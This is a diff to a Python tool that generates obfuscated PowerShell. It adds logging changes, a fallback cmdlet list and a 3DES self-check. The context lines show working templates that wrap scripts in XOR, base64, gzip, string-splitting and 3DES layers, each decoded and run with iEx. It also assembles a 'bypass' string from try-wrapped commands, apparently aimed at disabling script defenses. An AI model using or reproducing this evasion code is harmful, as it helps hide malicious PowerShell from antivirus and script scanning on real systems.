@@ -29,14 +29,16 @@ bypass = [
     ]
 
 def get_cmdlets():
-    log.debug('Getting commandlets')
+    log.info('Getting commandlets')
+    ret = ''
     if os.path.exists('/usr/bin/pwsh'):
         log.debug('Found powershell core')
         ret = subprocess.check_output('''/usr/bin/pwsh -C "Get-Command * {$_.CommandType -eq 'Cmdlet'} |  select name -expandproperty name"''', shell=True).decode('utf-8').strip()
-        return ret.split('\n')
-    log.debug('Unable to find powershell core')
-    return []
-
+    else:
+        log.warn('Unable to find powershell core, using builtin list')
+        with open('cmdlets.lst','r') as f:
+            ret = f.read()
+    return list(filter(lambda x:x, ret.split('\n')))
 
 def remove_block_comments(s):
     if type(s) != str:
@@ -50,11 +52,11 @@ def wrap_try(s):
     return 'try{{{0}}}catch{{}}'.format(s)
 
 def build_bypass(l=bypass):
-    log.debug('Building Bypass')
+    log.info('Building Bypass')
     return ';'.join(map(wrap_try,l))
 
 def fs_xor(s, k=None):
-    log.debug('Running Forward Single Char XOR Obfuscation')
+    log.info('Running Forward Single Char XOR Obfuscation')
     if type(s) != str:
         s = s.decode('utf-8')
     if not k:
@@ -63,7 +65,7 @@ def fs_xor(s, k=None):
     return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k))
 
 def rs_xor(s, k=None):
-    log.debug('Running Reverse Single Char XOR Obfuscation')
+    log.info('Running Reverse Single Char XOR Obfuscation')
     if type(s) != str:
         s = s.decode('utf-8')
     if not k:
@@ -72,7 +74,7 @@ def rs_xor(s, k=None):
     return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=$a.Length;$i--;){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k))
 
 def fm_xor(s, k='', length=None):
-    log.debug('Running Forward Multi Char XOR Obfuscation')
+    log.info('Running Forward Multi Char XOR Obfuscation')
     if type(s) != str:
         s = s.decode('utf-8')
     if not len(k) or not length:
@@ -82,20 +84,20 @@ def fm_xor(s, k='', length=None):
     return dwrite('''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));$z=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{1}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor $z[$i%$z.length])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), base64.b64encode(k.encode('utf-8')).decode('utf-8')))
 
 def b64(s):
-    log.debug('Running Base64 Obfuscation')
+    log.info('Running Base64 Obfuscation')
     if type(s) != bytes:
         s = s.encode('utf-8')
     return dwrite('iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}")))'.lower().format(base64.b64encode(s).decode('utf-8')))
 
 def gz(s):
-    log.debug('Running GZIP Obfuscation')
+    log.info('Running GZIP Obfuscation')
     if type(s) != bytes:
         s = s.encode('utf-8')
     s = gzip.compress(s)
     return dwrite('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{0}"));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));'''.lower().format(base64.b64encode(s).decode('utf-8')))
 
 def string_obfu(s):
-    log.debug('Running String Obfuscation')
+    log.info('Running String Obfuscation')
     if type(s) != str:
         s = s.decode('utf-8')
     f_strings = []
@@ -120,15 +122,24 @@ def string_obfu(s):
     return dwrite(s)
 
 def triple_des(s):
-    log.debug('Running 3DES Obfuscation')
+    if type(s) != str:
+        s = s.decode('utf-8')
+    log.info('Running 3DES Obfuscation')
     key = os.getrandom(16)
     iv = os.getrandom(8)
     des = DES3.new(key, DES3.MODE_CBC, iv)
     s += ' '*(8-(len(s)%8))
     enc = des.encrypt(s)
-    
     dec = DES3.new(key, DES3.MODE_CBC, iv)
-    log.debug(dec.decrypt(enc))
+    try:
+        if dec.decrypt(enc) == s.encode('utf-8'):
+            log.debug("Encryption is working fine")
+        else:
+            log.debug("Strings do no match, no other error")
+            raise Exception('Strings do not match')
+    except:
+        log.error("Encryption is fucked")
+        raise Exception('Encryption routine is borked')
     
     key = base64.b64encode(key).decode('utf-8')
     iv = base64.b64encode(iv).decode('utf-8')
